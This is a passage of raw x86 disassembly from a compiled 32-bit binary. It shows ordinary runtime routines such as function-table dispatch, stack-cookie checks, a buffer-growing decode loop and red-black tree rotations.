   19e5b:	push   edi
   19e5c:	push   DWORD PTR [ebp+0x8]
   19e5f:	mov    ebx,ecx
   19e61:	call   0x19d72
   19e66:	lea    eax,[esi+0x1]
   19e69:	movzx  edx,BYTE PTR [eax]
   19e6c:	push   eax
   19e6d:	inc    edi
   19e6e:	lea    edx,[edx*8+0x7a4b0]
   19e75:	push   edi
   19e76:	push   edx
   19e77:	mov    ecx,ebx
   19e79:	call   DWORD PTR [edx+0x4]
   19e7c:	pop    edi
   19e7d:	pop    esi
   19e7e:	pop    ebx
   19e7f:	pop    ebp
   19e80:	ret    0xc
   19e83:	int3   
   19e84:	int3   
   19e85:	int3   
   19e86:	int3   
   19e87:	int3   
   19e88:	mov    edi,edi
   19e8a:	push   ebp
   19e8b:	mov    ebp,esp
   19e8d:	push   ebx
   19e8e:	push   esi
   19e8f:	mov    esi,DWORD PTR [ebp+0x10]
   19e92:	push   edi
   19e93:	mov    edi,DWORD PTR [ebp+0xc]
   19e96:	push   esi
   19e97:	push   edi
   19e98:	push   DWORD PTR [ebp+0x8]
   19e9b:	mov    ebx,ecx
   19e9d:	call   0x19d72
   19ea2:	lea    eax,[esi+0x1]
   19ea5:	movzx  edx,BYTE PTR [eax]
   19ea8:	push   eax
   19ea9:	inc    edi
   19eaa:	lea    edx,[edx*8+0x7acb8]
   19eb1:	push   edi
   19eb2:	push   edx
   19eb3:	mov    ecx,ebx
   19eb5:	call   DWORD PTR [edx+0x4]
   19eb8:	pop    edi
   19eb9:	pop    esi
   19eba:	pop    ebx
   19ebb:	pop    ebp
   19ebc:	ret    0xc
   19ebf:	int3   
   19ec0:	int3   
   19ec1:	int3   
   19ec2:	int3   
   19ec3:	int3   
   19ec4:	mov    edi,edi
   19ec6:	push   ebp
   19ec7:	mov    ebp,esp
   19ec9:	mov    DWORD PTR [ecx],0x1
   19ecf:	pop    ebp
   19ed0:	jmp    0x19e4c
   19ed5:	int3   
   19ed6:	int3   
   19ed7:	int3   
   19ed8:	int3   
   19ed9:	int3   
   19eda:	mov    edi,edi
   19edc:	push   ebp
   19edd:	mov    ebp,esp
   19edf:	mov    DWORD PTR [ecx+0x4],0x1
   19ee6:	pop    ebp
   19ee7:	jmp    0x19e4c
   19eec:	int3   
   19eed:	int3   
   19eee:	int3   
   19eef:	int3   
   19ef0:	int3   
   19ef1:	int3   
   19ef2:	mov    edi,edi
   19ef4:	push   ebp
   19ef5:	mov    ebp,esp
   19ef7:	mov    eax,DWORD PTR [ebp+0x10]
   19efa:	sub    esp,0x10
   19efd:	test   BYTE PTR [eax+0x1],0x38
   19f01:	push   eax
   19f02:	push   DWORD PTR [ebp+0xc]
   19f05:	jne    0x19f1a
   19f07:	mov    DWORD PTR [ebp-0x8],0x5bf6
   19f0e:	mov    DWORD PTR [ebp-0x4],0x19d72
   19f15:	lea    eax,[ebp-0x8]
   19f18:	jmp    0x19f2b
   19f1a:	mov    DWORD PTR [ebp-0x10],0x52f6
   19f21:	mov    DWORD PTR [ebp-0xc],0x19d72
   19f28:	lea    eax,[ebp-0x10]
   19f2b:	push   eax
   19f2c:	call   0x19d72
   19f31:	leave  
   19f32:	ret    0xc
   19f35:	int3   
   19f36:	int3   
   19f37:	int3   
   19f38:	int3   
   19f39:	int3   
   19f3a:	mov    edi,edi
   19f3c:	push   ebp
   19f3d:	mov    ebp,esp
   19f3f:	mov    eax,DWORD PTR [ebp+0x10]
   19f42:	sub    esp,0x10
   19f45:	test   BYTE PTR [eax+0x1],0x38
   19f49:	push   eax
   19f4a:	push   DWORD PTR [ebp+0xc]
   19f4d:	jne    0x19f62
   19f4f:	mov    DWORD PTR [ebp-0x8],0x66f7
   19f56:	mov    DWORD PTR [ebp-0x4],0x19d72
   19f5d:	lea    eax,[ebp-0x8]
   19f60:	jmp    0x19f73
   19f62:	mov    DWORD PTR [ebp-0x10],0x52f7
   19f69:	mov    DWORD PTR [ebp-0xc],0x19d72
   19f70:	lea    eax,[ebp-0x10]
   19f73:	push   eax
   19f74:	call   0x19d72
   19f79:	leave  
   19f7a:	ret    0xc
   19f7d:	int3   
   19f7e:	int3   
   19f7f:	int3   
   19f80:	int3   
   19f81:	int3   
   19f82:	mov    edi,edi
   19f84:	push   ebp
   19f85:	mov    ebp,esp
   19f87:	push   ecx
   19f88:	push   ecx
   19f89:	mov    edx,DWORD PTR [ebp+0x10]
   19f8c:	mov    al,BYTE PTR [edx+0x1]
   19f8f:	cmp    al,0x15
   19f91:	je     0x19fb1
   19f93:	cmp    al,0x25
   19f95:	je     0x19fb1
   19f97:	and    al,0x38
   19f99:	cmp    al,0x10
   19f9b:	je     0x19fa9
   19f9d:	cmp    al,0x18
   19f9f:	je     0x19fa9
   19fa1:	cmp    al,0x20
   19fa3:	je     0x19fa9
   19fa5:	cmp    al,0x28
   19fa7:	jne    0x19fbd
   19fa9:	mov    eax,DWORD PTR [ecx+0x8]
   19fac:	or     DWORD PTR [eax],0xffffffff
   19faf:	jmp    0x19fbd
   19fb1:	mov    eax,DWORD PTR [edx+0x2]
   19fb4:	mov    eax,DWORD PTR [eax]
   19fb6:	push   esi
   19fb7:	mov    esi,DWORD PTR [ecx+0x8]
   19fba:	mov    DWORD PTR [esi],eax
   19fbc:	pop    esi
   19fbd:	push   edx
   19fbe:	push   DWORD PTR [ebp+0xc]
   19fc1:	lea    eax,[ebp-0x8]
   19fc4:	push   eax
   19fc5:	mov    DWORD PTR [ebp-0x8],0x52ff
   19fcc:	mov    DWORD PTR [ebp-0x4],0x19d72
   19fd3:	call   0x19d72
   19fd8:	leave  
   19fd9:	ret    0xc
   19fdc:	int3   
   19fdd:	int3   
   19fde:	int3   
   19fdf:	int3   
   19fe0:	int3   
   19fe1:	int3   
   19fe2:	mov    edi,edi
   19fe4:	push   ebp
   19fe5:	mov    ebp,esp
   19fe7:	sub    esp,0x5c
   19fea:	mov    eax,ds:0x7eb38
   19fef:	xor    eax,ebp
   19ff1:	mov    DWORD PTR [ebp-0x4],eax
   19ff4:	mov    eax,DWORD PTR [ebp+0x10]
   19ff7:	push   esi
   19ff8:	mov    esi,DWORD PTR [ebp+0x8]
   19ffb:	push   edi
   19ffc:	mov    edi,DWORD PTR [ebp+0xc]
   19fff:	push   0x0
   1a001:	push   eax
   1a002:	lea    ecx,[ebp-0x5c]
   1a005:	call   0x19d38
   1a00a:	push   edi
   1a00b:	push   esi
   1a00c:	lea    ecx,[ebp-0x5c]
   1a00f:	call   0x19c7a
   1a014:	mov    ecx,DWORD PTR [ebp-0x4]
   1a017:	pop    edi
   1a018:	xor    ecx,ebp
   1a01a:	pop    esi
   1a01b:	call   0x1da3b
   1a020:	leave  
   1a021:	ret    0xc
   1a024:	int3   
   1a025:	int3   
   1a026:	int3   
   1a027:	int3   
   1a028:	int3   
   1a029:	int3   
   1a02a:	mov    edi,edi
   1a02c:	push   ebp
   1a02d:	mov    ebp,esp
   1a02f:	push   esi
   1a030:	mov    esi,DWORD PTR [ebp+0x8]
   1a033:	push   edi
   1a034:	mov    edi,ecx
   1a036:	cmp    edi,esi
   1a038:	je     0x1a065
   1a03a:	mov    eax,DWORD PTR [edi+0x4]
   1a03d:	cmp    eax,DWORD PTR [esi+0x4]
   1a040:	je     0x1a054
   1a042:	cmp    BYTE PTR [edi],0x0
   1a045:	je     0x1a04e
   1a047:	push   eax
   1a048:	call   0x10a9a
   1a04d:	pop    ecx
   1a04e:	mov    al,BYTE PTR [esi]
   1a050:	mov    BYTE PTR [edi],al
   1a052:	jmp    0x1a05c
   1a054:	cmp    BYTE PTR [esi],0x0
   1a057:	je     0x1a05c
   1a059:	mov    BYTE PTR [edi],0x1
   1a05c:	mov    eax,DWORD PTR [esi+0x4]
   1a05f:	mov    BYTE PTR [esi],0x0
   1a062:	mov    DWORD PTR [edi+0x4],eax
   1a065:	mov    eax,edi
   1a067:	pop    edi
   1a068:	pop    esi
   1a069:	pop    ebp
   1a06a:	ret    0x4
   1a06d:	int3   
   1a06e:	int3   
   1a06f:	int3   
   1a070:	int3   
   1a071:	int3   
   1a072:	mov    edi,edi
   1a074:	push   ebp
   1a075:	mov    ebp,esp
   1a077:	sub    esp,0x50
   1a07a:	push   ebx
   1a07b:	push   esi
   1a07c:	push   edi
   1a07d:	mov    edi,0x4000
   1a082:	push   edi
   1a083:	call   0x10a66
   1a088:	pop    ecx
   1a089:	xor    ebx,ebx
   1a08b:	push   0x38
   1a08d:	push   0x1ec4a
   1a092:	cmp    eax,ebx
   1a094:	mov    DWORD PTR [ebp-0x4],eax
   1a097:	mov    DWORD PTR [ebp-0xc],eax
   1a09a:	push   0x2f
   1a09c:	lea    eax,[ebp-0x50]
   1a09f:	setne  BYTE PTR [ebp-0x10]
   1a0a3:	push   eax
   1a0a4:	xor    esi,esi
   1a0a6:	mov    DWORD PTR [ebp-0x30],ebx
   1a0a9:	mov    DWORD PTR [ebp-0x2c],ebx
   1a0ac:	mov    DWORD PTR [ebp-0x28],ebx
   1a0af:	mov    DWORD PTR [ebp-0x4c],ebx
   1a0b2:	mov    DWORD PTR [ebp-0x50],ebx
   1a0b5:	call   0x1b928
   1a0ba:	test   eax,eax
   1a0bc:	je     0x1a0db
   1a0be:	mov    esi,DWORD PTR [ebp+0x8]
   1a0c1:	mov    BYTE PTR [esi],bl
   1a0c3:	mov    DWORD PTR [esi+0x4],ebx
   1a0c6:	cmp    BYTE PTR [ebp-0x10],bl
   1a0c9:	je     0x1a0d4
   1a0cb:	push   DWORD PTR [ebp-0x4]
   1a0ce:	call   0x10a9a
   1a0d3:	pop    ecx
   1a0d4:	mov    eax,esi
   1a0d6:	jmp    0x1a1f0
   1a0db:	mov    eax,DWORD PTR [ebp+0x10]
   1a0de:	mov    DWORD PTR [ebp-0x4c],eax
   1a0e1:	mov    eax,DWORD PTR [ebp+0xc]
   1a0e4:	mov    DWORD PTR [ebp-0x50],eax
   1a0e7:	mov    eax,DWORD PTR [ebp-0xc]
   1a0ea:	add    eax,esi
   1a0ec:	mov    DWORD PTR [ebp-0x44],eax
   1a0ef:	push   0x4
   1a0f1:	lea    eax,[ebp-0x50]
   1a0f4:	push   eax
   1a0f5:	mov    DWORD PTR [ebp-0x40],edi
   1a0f8:	call   0x1babc
   1a0fd:	cmp    eax,0xfffffffc
   1a100:	mov    DWORD PTR [ebp+0x10],eax
   1a103:	jl     0x1a117
   1a105:	cmp    eax,0xfffffffd
   1a108:	jle    0x1a1a0
   1a10e:	cmp    eax,0x2
   1a111:	je     0x1a1a0
   1a117:	mov    eax,edi
   1a119:	sub    eax,DWORD PTR [ebp-0x40]
   1a11c:	add    esi,eax
   1a11e:	cmp    DWORD PTR [ebp-0x40],ebx
   1a121:	jne    0x1a18a
   1a123:	mov    al,BYTE PTR [ebp-0x10]
   1a126:	mov    BYTE PTR [ebp-0x18],al
   1a129:	mov    eax,DWORD PTR [ebp-0xc]
   1a12c:	mov    DWORD PTR [ebp-0x14],eax
   1a12f:	lea    eax,[esi+0x4000]
   1a135:	push   eax
   1a136:	mov    BYTE PTR [ebp-0x10],bl
   1a139:	call   0x10a66
   1a13e:	pop    ecx
   1a13f:	cmp    eax,ebx
   1a141:	setne  cl
   1a144:	mov    DWORD PTR [ebp-0x4],eax
   1a147:	lea    eax,[ebp-0x8]
   1a14a:	mov    BYTE PTR [ebp-0x8],cl
   1a14d:	push   eax
   1a14e:	lea    ecx,[ebp-0x10]
   1a151:	call   0x1a02a
   1a156:	cmp    BYTE PTR [ebp-0x8],bl
   1a159:	je     0x1a164
   1a15b:	push   DWORD PTR [ebp-0x4]
   1a15e:	call   0x10a9a
   1a163:	pop    ecx
   1a164:	push   esi
   1a165:	push   DWORD PTR [ebp-0x14]
   1a168:	push   DWORD PTR [ebp-0xc]
   1a16b:	call   0x1daa0
   1a170:	add    esp,0xc
   1a173:	cmp    BYTE PTR [ebp-0x18],bl
   1a176:	je     0x1a181
   1a178:	push   DWORD PTR [ebp-0x14]
   1a17b:	call   0x10a9a
   1a180:	pop    ecx
   1a181:	cmp    DWORD PTR [ebp-0x40],ebx
   1a184:	je     0x1a0e7
   1a18a:	lea    eax,[ebp-0x50]
   1a18d:	push   eax
   1a18e:	call   0x1cce2
   1a193:	cmp    DWORD PTR [ebp+0x10],0x1
   1a197:	jne    0x1a1c2
   1a199:	mov    eax,DWORD PTR [ebp+0x14]
   1a19c:	mov    DWORD PTR [eax],esi
   1a19e:	jmp    0x1a1e2
   1a1a0:	lea    eax,[ebp-0x50]
   1a1a3:	push   eax
   1a1a4:	call   0x1cce2
   1a1a9:	mov    esi,DWORD PTR [ebp+0x8]
   1a1ac:	mov    BYTE PTR [esi],bl
   1a1ae:	mov    DWORD PTR [esi+0x4],ebx
   1a1b1:	cmp    BYTE PTR [ebp-0x10],bl
   1a1b4:	je     0x1a0d4
   1a1ba:	push   DWORD PTR [ebp-0xc]
   1a1bd:	jmp    0x1a0ce
   1a1c2:	lea    eax,[ebp-0x18]
   1a1c5:	push   eax
   1a1c6:	lea    ecx,[ebp-0x10]
   1a1c9:	mov    BYTE PTR [ebp-0x18],bl
   1a1cc:	mov    DWORD PTR [ebp-0x14],ebx
   1a1cf:	call   0x1a02a
   1a1d4:	cmp    BYTE PTR [ebp-0x18],bl
   1a1d7:	je     0x1a1e2
   1a1d9:	push   DWORD PTR [ebp-0x14]
   1a1dc:	call   0x10a9a
   1a1e1:	pop    ecx
   1a1e2:	mov    eax,DWORD PTR [ebp+0x8]
   1a1e5:	mov    cl,BYTE PTR [ebp-0x10]
   1a1e8:	mov    BYTE PTR [eax],cl
   1a1ea:	mov    ecx,DWORD PTR [ebp-0xc]
   1a1ed:	mov    DWORD PTR [eax+0x4],ecx
   1a1f0:	pop    edi
   1a1f1:	pop    esi
   1a1f2:	pop    ebx
   1a1f3:	leave  
   1a1f4:	ret    0x10
   1a1f7:	int3   
   1a1f8:	int3   
   1a1f9:	int3   
   1a1fa:	int3   
   1a1fb:	int3   
   1a1fc:	xor    eax,eax
   1a1fe:	push   eax
   1a1ff:	push   eax
   1a200:	push   eax
   1a201:	push   eax
   1a202:	push   0x7f840
   1a207:	call   DWORD PTR ds:0x1ee28
   1a20d:	test   eax,eax
   1a20f:	setge  al
   1a212:	ret    
   1a213:	int3   
   1a214:	int3   
   1a215:	int3   
   1a216:	int3   
   1a217:	int3   
   1a218:	push   0x0
   1a21a:	push   0x7f840
   1a21f:	call   DWORD PTR ds:0x1ee24
   1a225:	ret    
   1a226:	int3   
   1a227:	int3   
   1a228:	int3   
   1a229:	int3   
   1a22a:	int3   
   1a22b:	int3   
   1a22c:	mov    edi,edi
   1a22e:	push   esi
   1a22f:	push   edi
   1a230:	push   0x1
   1a232:	xor    edi,edi
   1a234:	push   edi
   1a235:	mov    esi,ecx
   1a237:	call   0x139ec
   1a23c:	cmp    DWORD PTR ds:0x7f6e4,edi
   1a242:	jne    0x1a259
   1a244:	mov    ecx,eax
   1a246:	mov    DWORD PTR ds:0x7f6e4,ecx
   1a24c:	mov    DWORD PTR [ecx],edi
   1a24e:	mov    ecx,DWORD PTR ds:0x7f6e4
   1a254:	xor    eax,eax
   1a256:	mov    DWORD PTR [ecx+0x8],edi
   1a259:	inc    DWORD PTR ds:0x7f868
   1a25f:	cmp    eax,edi
   1a261:	je     0x1a26a
   1a263:	push   eax
   1a264:	call   0x10a9a
   1a269:	pop    ecx
   1a26a:	push   edi
   1a26b:	push   DWORD PTR ds:0x7f6e4
   1a271:	mov    ecx,esi
   1a273:	call   0x139ec
   1a278:	mov    DWORD PTR [esi+0xc],edi
   1a27b:	mov    DWORD PTR [esi+0x4],eax
   1a27e:	mov    DWORD PTR [eax],eax
   1a280:	mov    esi,DWORD PTR [esi+0x4]
   1a283:	pop    edi
   1a284:	mov    DWORD PTR [esi+0x8],esi
   1a287:	pop    esi
   1a288:	ret    
   1a289:	int3   
   1a28a:	int3   
   1a28b:	int3   
   1a28c:	int3   
   1a28d:	int3   
   1a28e:	mov    edi,edi
   1a290:	push   ebx
   1a291:	push   esi
   1a292:	xor    ebx,ebx
   1a294:	push   ebx
   1a295:	push   0x7f840
   1a29a:	call   0x11c50
   1a29f:	call   eax
   1a2a1:	push   0x10
   1a2a3:	call   0x10a66
   1a2a8:	mov    esi,eax
   1a2aa:	pop    ecx
   1a2ab:	cmp    esi,ebx
   1a2ad:	je     0x1a2c1
   1a2af:	mov    ecx,esi
   1a2b1:	mov    BYTE PTR [esi+0x8],bl
   1a2b4:	call   0x1a22c
   1a2b9:	mov    DWORD PTR ds:0x7f860,esi
   1a2bf:	jmp    0x1a2c7
   1a2c1:	mov    DWORD PTR ds:0x7f860,ebx
   1a2c7:	push   0x10
   1a2c9:	call   0x10a66
   1a2ce:	mov    esi,eax
   1a2d0:	pop    ecx
   1a2d1:	cmp    esi,ebx
   1a2d3:	je     0x1a2e7
   1a2d5:	mov    ecx,esi
   1a2d7:	mov    BYTE PTR [esi+0x8],bl
   1a2da:	call   0x14128
   1a2df:	mov    DWORD PTR ds:0x7f864,esi
   1a2e5:	jmp    0x1a2ed
   1a2e7:	mov    DWORD PTR ds:0x7f864,ebx
   1a2ed:	pop    esi
   1a2ee:	pop    ebx
   1a2ef:	ret    
   1a2f0:	int3   
   1a2f1:	int3   
   1a2f2:	int3   
   1a2f3:	int3   
   1a2f4:	int3   
   1a2f5:	int3   
   1a2f6:	mov    eax,ecx
   1a2f8:	add    DWORD PTR [eax+0x8],0x4
   1a2fc:	mov    ecx,DWORD PTR [eax+0x8]
   1a2ff:	cmp    ecx,DWORD PTR [eax+0x4]
   1a302:	jne    0x1a31d
   1a304:	add    DWORD PTR [eax+0xc],0x4
   1a308:	mov    ecx,DWORD PTR [eax+0xc]
   1a30b:	mov    ecx,DWORD PTR [ecx]
   1a30d:	mov    DWORD PTR [eax],ecx
   1a30f:	add    ecx,0x1000
   1a315:	mov    DWORD PTR [eax+0x4],ecx
   1a318:	mov    ecx,DWORD PTR [eax]
   1a31a:	mov    DWORD PTR [eax+0x8],ecx
   1a31d:	ret    
   1a31e:	int3   
   1a31f:	int3   
   1a320:	int3   
   1a321:	int3   
   1a322:	int3   
   1a323:	int3   
   1a324:	mov    edi,edi
   1a326:	push   ebp
   1a327:	mov    ebp,esp
   1a329:	mov    eax,ecx
   1a32b:	mov    ecx,DWORD PTR [ebp+0xc]
   1a32e:	mov    edx,DWORD PTR [ecx]
   1a330:	mov    DWORD PTR [eax],edx
   1a332:	mov    edx,DWORD PTR [ecx]
   1a334:	add    edx,0x1000
   1a33a:	mov    DWORD PTR [eax+0x4],edx
   1a33d:	mov    edx,DWORD PTR [ebp+0x8]
   1a340:	mov    DWORD PTR [eax+0x8],edx
   1a343:	mov    DWORD PTR [eax+0xc],ecx
   1a346:	pop    ebp
   1a347:	ret    0x8
   1a34a:	int3   
   1a34b:	int3   
   1a34c:	int3   
   1a34d:	int3   
   1a34e:	int3   
   1a34f:	int3   
   1a350:	mov    edi,edi
   1a352:	push   ebp
   1a353:	mov    ebp,esp
   1a355:	mov    eax,DWORD PTR [ebp+0x8]
   1a358:	mov    edx,DWORD PTR ds:0x7f89c
   1a35e:	jmp    0x1a362
   1a360:	mov    eax,ecx
   1a362:	mov    ecx,DWORD PTR [eax+0x8]
   1a365:	cmp    ecx,edx
   1a367:	jne    0x1a360
   1a369:	pop    ebp
   1a36a:	ret    0x4
   1a36d:	int3   
   1a36e:	int3   
   1a36f:	int3   
   1a370:	int3   
   1a371:	int3   
   1a372:	mov    edi,edi
   1a374:	push   ebp
   1a375:	mov    ebp,esp
   1a377:	mov    eax,DWORD PTR [ebp+0x8]
   1a37a:	mov    edx,DWORD PTR ds:0x7f89c
   1a380:	jmp    0x1a384
   1a382:	mov    eax,ecx
   1a384:	mov    ecx,DWORD PTR [eax]
   1a386:	cmp    ecx,edx
   1a388:	jne    0x1a382
   1a38a:	pop    ebp
   1a38b:	ret    0x4
   1a38e:	int3   
   1a38f:	int3   
   1a390:	int3   
   1a391:	int3   
   1a392:	int3   
   1a393:	int3   
   1a394:	mov    edi,edi
   1a396:	push   esi
   1a397:	mov    esi,ecx
   1a399:	mov    ecx,DWORD PTR [esi]
   1a39b:	mov    eax,DWORD PTR [ecx+0x8]
   1a39e:	cmp    eax,DWORD PTR ds:0x7f89c
   1a3a4:	je     0x1a3b2
   1a3a6:	push   eax
   1a3a7:	call   0x1a372
   1a3ac:	jmp    0x1a3c1
   1a3ae:	mov    DWORD PTR [esi],eax
   1a3b0:	mov    ecx,eax
   1a3b2:	mov    eax,DWORD PTR [ecx+0x4]
   1a3b5:	cmp    ecx,DWORD PTR [eax+0x8]
   1a3b8:	je     0x1a3ae
   1a3ba:	mov    ecx,DWORD PTR [esi]
   1a3bc:	cmp    DWORD PTR [ecx+0x8],eax
   1a3bf:	je     0x1a3c3
   1a3c1:	mov    DWORD PTR [esi],eax
   1a3c3:	pop    esi
   1a3c4:	ret    
   1a3c5:	int3   
   1a3c6:	int3   
   1a3c7:	int3   
   1a3c8:	int3   
   1a3c9:	int3   
   1a3ca:	mov    edi,edi
   1a3cc:	push   ebp
   1a3cd:	mov    ebp,esp
   1a3cf:	mov    eax,DWORD PTR [ebp+0x8]
   1a3d2:	jmp    0x1a3e2
   1a3d4:	mov    ecx,DWORD PTR [eax]
   1a3d6:	mov    edx,DWORD PTR [ebp+0x10]
   1a3d9:	add    DWORD PTR [ebp+0x10],0x4
   1a3dd:	mov    DWORD PTR [edx],ecx
   1a3df:	add    eax,0x4
   1a3e2:	cmp    eax,DWORD PTR [ebp+0xc]
   1a3e5:	jne    0x1a3d4
   1a3e7:	mov    eax,DWORD PTR [ebp+0x10]
   1a3ea:	pop    ebp
   1a3eb:	ret    0xc
   1a3ee:	int3   
   1a3ef:	int3   
   1a3f0:	int3   
   1a3f1:	int3   
   1a3f2:	int3   
   1a3f3:	int3   
   1a3f4:	mov    edi,edi
   1a3f6:	push   ebp
   1a3f7:	mov    ebp,esp
   1a3f9:	mov    eax,DWORD PTR [ebp+0x8]
   1a3fc:	test   eax,eax
   1a3fe:	jge    0x1a402
   1a400:	xor    eax,eax
   1a402:	shl    eax,0x2
   1a405:	push   eax
   1a406:	call   0x10a66
   1a40b:	pop    ecx
   1a40c:	pop    ebp
   1a40d:	ret    0x8
   1a410:	int3   
   1a411:	int3   
   1a412:	int3   
   1a413:	int3   
   1a414:	int3   
   1a415:	int3   
   1a416:	mov    edi,edi
   1a418:	push   ebp
   1a419:	mov    ebp,esp
   1a41b:	push   esi
   1a41c:	mov    esi,ecx
   1a41e:	push   DWORD PTR [esi]
   1a420:	call   0x10a9a
   1a425:	test   BYTE PTR [ebp+0x8],0x1
   1a429:	pop    ecx
   1a42a:	je     0x1a433
   1a42c:	push   esi
   1a42d:	call   0x10a9a
   1a432:	pop    ecx
   1a433:	mov    eax,esi
   1a435:	pop    esi
   1a436:	pop    ebp
   1a437:	ret    0x4
   1a43a:	int3   
   1a43b:	int3   
   1a43c:	int3   
   1a43d:	int3   
   1a43e:	int3   
   1a43f:	int3   
   1a440:	mov    edi,edi
   1a442:	push   ebp
   1a443:	mov    ebp,esp
   1a445:	mov    eax,ds:0x7f894
   1a44a:	sub    esp,0x20
   1a44d:	push   ebx
   1a44e:	push   esi
   1a44f:	push   edi
   1a450:	lea    esi,[eax+0x4]
   1a453:	lea    edi,[ebp-0x10]
   1a456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a45a:	lea    ebx,[eax+0x14]
   1a45d:	jmp    0x1a47b
   1a45f:	mov    eax,DWORD PTR [eax]
   1a461:	mov    ecx,DWORD PTR [eax+0x8]
   1a464:	cmp    ecx,DWORD PTR [ebp+0x8]
   1a467:	jne    0x1a473
   1a469:	cmp    BYTE PTR [eax+0x24],0x0
   1a46d:	jne    0x1a48c
   1a46f:	mov    BYTE PTR [eax+0x24],0x1
   1a473:	lea    ecx,[ebp-0x10]
   1a476:	call   0x1a2f6
   1a47b:	mov    eax,DWORD PTR [ebp-0x8]
   1a47e:	lea    edi,[ebp-0x20]
   1a481:	mov    esi,ebx
   1a483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a487:	cmp    eax,DWORD PTR [ebp-0x18]
   1a48a:	jne    0x1a45f
   1a48c:	pop    edi
   1a48d:	pop    esi
   1a48e:	pop    ebx
   1a48f:	leave  
   1a490:	ret    0x4
   1a493:	int3   
   1a494:	int3   
   1a495:	int3   
   1a496:	int3   
   1a497:	int3   
   1a498:	mov    eax,ecx
   1a49a:	xor    ecx,ecx
   1a49c:	mov    DWORD PTR [eax+0x4],ecx
   1a49f:	mov    DWORD PTR [eax+0x8],ecx
   1a4a2:	mov    DWORD PTR [eax+0xc],ecx
   1a4a5:	mov    DWORD PTR [eax+0x10],ecx
   1a4a8:	mov    DWORD PTR [eax+0x14],ecx
   1a4ab:	mov    DWORD PTR [eax+0x18],ecx
   1a4ae:	mov    DWORD PTR [eax+0x1c],ecx
   1a4b1:	mov    DWORD PTR [eax+0x20],ecx
   1a4b4:	mov    DWORD PTR [eax+0x24],ecx
   1a4b7:	mov    DWORD PTR [eax+0x28],ecx
   1a4ba:	mov    DWORD PTR [eax+0x2c],ecx
   1a4bd:	ret    0x4
   1a4c0:	int3   
   1a4c1:	int3   
   1a4c2:	int3   
   1a4c3:	int3   
   1a4c4:	int3   
   1a4c5:	int3   
   1a4c6:	mov    edi,edi
   1a4c8:	push   ebp
   1a4c9:	mov    ebp,esp
   1a4cb:	sub    esp,0x10
   1a4ce:	push   esi
   1a4cf:	push   edi
   1a4d0:	lea    esi,[ecx+0x4]
   1a4d3:	lea    edi,[ebp-0x10]
   1a4d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a4da:	mov    eax,DWORD PTR [ebp-0x8]
   1a4dd:	pop    edi
   1a4de:	pop    esi
   1a4df:	leave  
   1a4e0:	ret    
   1a4e1:	int3   
   1a4e2:	int3   
   1a4e3:	int3   
   1a4e4:	int3   
   1a4e5:	int3   
   1a4e6:	mov    edi,edi
   1a4e8:	push   ebp
   1a4e9:	mov    ebp,esp
   1a4eb:	mov    edx,DWORD PTR [ebp+0x8]
   1a4ee:	mov    eax,DWORD PTR [edx+0x8]
   1a4f1:	push   esi
   1a4f2:	mov    esi,DWORD PTR [eax]
   1a4f4:	mov    DWORD PTR [edx+0x8],esi
   1a4f7:	mov    esi,DWORD PTR [eax]
   1a4f9:	cmp    esi,DWORD PTR ds:0x7f89c
   1a4ff:	je     0x1a504
   1a501:	mov    DWORD PTR [esi+0x4],edx
   1a504:	mov    esi,DWORD PTR [edx+0x4]
   1a507:	mov    DWORD PTR [eax+0x4],esi
   1a50a:	mov    ecx,DWORD PTR [ecx+0x4]
   1a50d:	pop    esi
   1a50e:	cmp    edx,DWORD PTR [ecx+0x4]
   1a511:	jne    0x1a518
   1a513:	mov    DWORD PTR [ecx+0x4],eax
   1a516:	jmp    0x1a526
   1a518:	mov    ecx,DWORD PTR [edx+0x4]
   1a51b:	cmp    edx,DWORD PTR [ecx]
   1a51d:	jne    0x1a523
   1a51f:	mov    DWORD PTR [ecx],eax
   1a521:	jmp    0x1a526
   1a523:	mov    DWORD PTR [ecx+0x8],eax
   1a526:	mov    DWORD PTR [eax],edx
   1a528:	mov    DWORD PTR [edx+0x4],eax
   1a52b:	pop    ebp
   1a52c:	ret    0x4
   1a52f:	int3   
   1a530:	int3   
   1a531:	int3   
   1a532:	int3   
   1a533:	int3   
   1a534:	mov    edi,edi
   1a536:	push   ebp
   1a537:	mov    ebp,esp
   1a539:	mov    edx,DWORD PTR [ebp+0x8]
   1a53c:	mov    eax,DWORD PTR [edx]
   1a53e:	push   esi
   1a53f:	mov    esi,DWORD PTR [eax+0x8]
   1a542:	mov    DWORD PTR [edx],esi
   1a544:	mov    esi,DWORD PTR [eax+0x8]
   1a547:	cmp    esi,DWORD PTR ds:0x7f89c
   1a54d:	je     0x1a552
   1a54f:	mov    DWORD PTR [esi+0x4],edx
   1a552:	mov    esi,DWORD PTR [edx+0x4]
   1a555:	mov    DWORD PTR [eax+0x4],esi
   1a558:	mov    ecx,DWORD PTR [ecx+0x4]
   1a55b:	pop    esi
   1a55c:	cmp    edx,DWORD PTR [ecx+0x4]
   1a55f:	jne    0x1a566
   1a561:	mov    DWORD PTR [ecx+0x4],eax
   1a564:	jmp    0x1a575
   1a566:	mov    ecx,DWORD PTR [edx+0x4]
   1a569:	cmp    edx,DWORD PTR [ecx+0x8]
   1a56c:	jne    0x1a573
   1a56e:	mov    DWORD PTR [ecx+0x8],eax
   1a571:	jmp    0x1a575
   1a573:	mov    DWORD PTR [ecx],eax
   1a575:	mov    DWORD PTR [eax+0x8],edx
   1a578:	mov    DWORD PTR [edx+0x4],eax
   1a57b:	pop    ebp
   1a57c:	ret    0x4
   1a57f:	int3   
   1a580:	int3   
   1a581:	int3   
   1a582:	int3   
   1a583:	int3   
   1a584:	mov    edi,edi
   1a586:	push   esi
   1a587:	mov    esi,ecx
   1a589:	mov    ecx,DWORD PTR [esi]
   1a58b:	cmp    DWORD PTR [ecx+0x14],0x0
